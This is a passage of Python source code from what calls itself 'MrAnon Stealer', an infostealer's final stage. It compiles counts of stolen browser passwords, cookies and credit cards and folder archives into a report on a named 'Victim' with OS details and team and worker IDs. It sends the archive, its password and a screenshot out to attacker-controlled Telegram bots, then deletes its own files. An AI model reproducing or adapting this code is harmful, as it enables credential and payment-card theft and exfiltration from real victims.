            if folder_info['category'] == category and folder in folders_to_archive:
                folder_counts[folder_info['archive_name']] = sum(folders_to_archive[folder])

        for folder_path, folder_info in sorted(fixed_paths.items(), key=lambda x: x[0]):
            if folder_info['category'] == category and folder_path in folders_to_archive:
                folder_counts[folder_info['archive_name']] = sum(folders_to_archive[folder_path])

        for folder_name, folder_count in folder_counts.items():
            if folder_count > 0:
                folder_line = '└ ' + folder_name
                if folder_count > 1:
                    folder_line += f' ({folder_count})'
                folder_lines.append(folder_line)

        if len(folder_lines) > 2:
            message_body += '\n'.join(folder_lines[:2]) + '\n└ ...'
        else:
            message_body += '\n'.join(folder_lines)

        message_body += '\n\n'
 
if total_browser_logins_count > 0:
    message_body += '🔑 Passwords: ' + str(total_browser_logins_count) + '\n'

    login_lines = [login_header for login_header in logins_headers]

    if len(login_lines) > 2:
        message_body += '\n'.join(login_lines[:2]) + '\n└ ...'
    else:
        message_body += '\n'.join(login_lines)

    message_body += '\n\n'

if total_browser_cookies_count > 0:
    message_body += '🍪 Cookies: ' + str(total_browser_cookies_count) + '\n'

    cookie_lines = [cookie_header for cookie_header in cookies_headers]

    if len(cookie_lines) > 2:
        message_body += '\n'.join(cookie_lines[:2]) + '\n└ ...'
    else:
        message_body += '\n'.join(cookie_lines)

    message_body += '\n\n'
    
if total_browser_ccards_count > 0:
    message_body += '💳 Credit Cards: ' + str(total_browser_ccards_count) + '\n'

    ccards_lines = [ccard_header for ccard_header in ccards_headers]

    if len(ccards_lines) > 2:
        message_body += '\n'.join(ccards_lines[:2]) + '\n└ ...'
    else:
        message_body += '\n'.join(ccards_lines)

    message_body += '\n\n'
    
message_body += '📦 Size: ' + str(round(os.path.getsize(archive_path) / 1048576, 2)) + '\n'
message_body += ' MB\n🗝 Password: <code>' + password.decode() + '</code>\n⬇️ Link: ' + str(dl_link)

for i in range(10):
    try:
        with open(screenshot_path, 'rb') as f:
            response = requests.post(
                telegram_url_G,
                params={'chat_id': chat_id_G, 'parse_mode': 'HTML', 'caption': message_body},
                files={'photo': f}
            )
            response.raise_for_status()
    except FileNotFoundError:
        continue
    except requests.exceptions.RequestException:
        time.sleep(2)
        continue
    except Exception:
        continue

telegram_url_P = f'https://api.telegram.org/bot{bot_token}/sendDocument'
message = f'MrAnon Stealer (Log Backup)\n\nTeam Name: {csTN}\nWorker ID: {csWID}\n\nVictim: {csUN} ({csSEIPB})\nOS: {csOSN} {csOSR} ({csOSV})\n\n'
message += f'Password: {password.decode()}\nLink: {dl_s_link}'

for i in range(10):
    try:
        with open(archive_path, 'rb') as f, requests.post(telegram_url_P, params={'chat_id': chat_id_P, 'caption': message}, files={'document': f}) as response:
            response.raise_for_status()
    except FileNotFoundError:
        pass
    except requests.exceptions.RequestException:
        time.sleep(2)
    except Exception:
        pass

shutil.rmtree(csBD, ignore_errors=True)
os.remove(screenshot_path)
os.remove(report_path)
os.remove(archive_path)










